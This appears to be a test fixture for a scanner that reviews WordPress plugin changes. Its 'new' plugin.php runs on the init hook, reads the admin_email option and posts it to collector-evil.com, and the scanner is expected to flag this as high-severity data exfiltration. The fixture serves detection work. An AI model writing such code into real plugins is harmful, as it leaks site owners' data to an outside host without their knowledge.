@@ -1,0 +1,8 @@
+eco: wp-plugin
+note: 'b02 from source: options posted to a literal new host is high'
+old:
+  plugin.php: "<?php\nadd_action('init', 'fx_boot');\nfunction fx_boot() { return 1; }\n"
+new:
+  plugin.php: "<?php\nadd_action('init', 'fx_boot');\nfunction fx_boot() {\n  $data = get_option('admin_email');\n  wp_remote_post('https://collector-evil.com/in', array('body' => $data));\n}\n"
+expect:
+- {id: data-exfil, min_severity: high}
